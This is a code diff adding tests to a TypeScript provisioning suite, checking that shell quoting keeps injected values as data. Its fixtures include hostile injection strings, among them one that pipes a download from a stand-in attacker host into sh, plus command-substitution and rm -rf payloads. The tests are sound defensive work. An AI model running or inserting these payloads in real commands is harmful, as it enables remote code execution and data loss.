@@ -10,6 +10,8 @@ import {
   interpolate,
   primaryPort,
   renderCompose,
+  interpolateShell,
+  shellQuote,
   type Bindings,
 } from "./compile.ts";
 import {
@@ -21,6 +23,7 @@ import {
   type BlueprintModel,
 } from "./synthesize.ts";
 import { NodeRegistry } from "@harness/flow";
+import { execSync } from "node:child_process";
 
 const odoo = findBlueprint("odoo-18-enterprise")!;
 
@@ -388,5 +391,58 @@ describe("synthesis: any stack, same artifact", () => {
     assert.deepEqual(g.nodes.map((n) => n.id), ["acquire", "repos", "compose", "start", "verify", "bundles"]);
     const yaml = renderCompose(r.blueprint, { inputs: { DB_PASSWORD: "x" }, seeds: {}, repos: { app: ["m"] } }, { portBase: 41000 });
     assert.ok(yaml.includes('"41000:8000"'));
+  });
+});
+
+describe("security: a binding must never become a command", () => {
+  const evil = `x'; curl https://evil.example/s | sh; echo '`;
+
+  test("a real shell treats a breakout payload as one literal word", () => {
+    // Asserting against a regex only tests my model of sh. Ask sh instead.
+    const quoted = shellQuote(evil);
+    const seen = execSync(`printf %s ${quoted}`, { encoding: "utf8" });
+    assert.equal(seen, evil, "the value round-trips as data, with nothing executed");
+  });
+
+  test("quoting holds for the payloads that usually break naive escaping", () => {
+    for (const payload of [
+      `a'b`,
+      `$(whoami)`,
+      "`id`",
+      "x\\'; rm -rf /tmp/nope; '",
+      '"; echo pwned; "',
+      "newline\nsecond-line",
+    ]) {
+      const seen = execSync(`printf %s ${shellQuote(payload)}`, { encoding: "utf8" });
+      assert.equal(seen, payload, `failed for ${JSON.stringify(payload)}`);
+    }
+  });
+
+  test("a password containing shell metacharacters survives as data", () => {
+    const bp = findBlueprint("odoo-18-enterprise")!;
+    const bindings: Bindings = {
+      inputs: { DB_PASSWORD: evil, ODOO_DB_NAME: "acme" },
+      seeds: {}, repos: { addons: ["a"] },
+    };
+    const out = interpolateShell("db_password = ${input.DB_PASSWORD}", bp, bindings);
+    assert.ok(out.includes("curl"), "the value is preserved");
+    assert.ok(!out.includes("; curl https://evil.example/s | sh; echo ''"), "but not as a command");
+    assert.equal(out, `db_password = ${shellQuote(evil)}`);
+  });
+
+  test("setup scripts in the compiled graph are quoted, not raw", () => {
+    const bp = findBlueprint("odoo-18-enterprise")!;
+    const g = compileProvisioning(bp, {
+      inputs: { DB_PASSWORD: evil, ODOO_DB_NAME: "acme" },
+      seeds: {}, repos: { addons: ["a"] },
+    });
+    const step = g.nodes.find((n) => n.id === "setup-write-conf")!;
+    const script = (step.config as { step: { script: string } }).step.script;
+    assert.ok(!script.includes("${input."), "placeholders are resolved at compile time");
+    assert.ok(script.includes(shellQuote(evil)), "and resolved through the quoting path");
+  });
+
+  test("an ordinary value round-trips unchanged apart from its quotes", () => {
+    assert.equal(shellQuote("odoo-dev"), "'odoo-dev'");
   });
 });
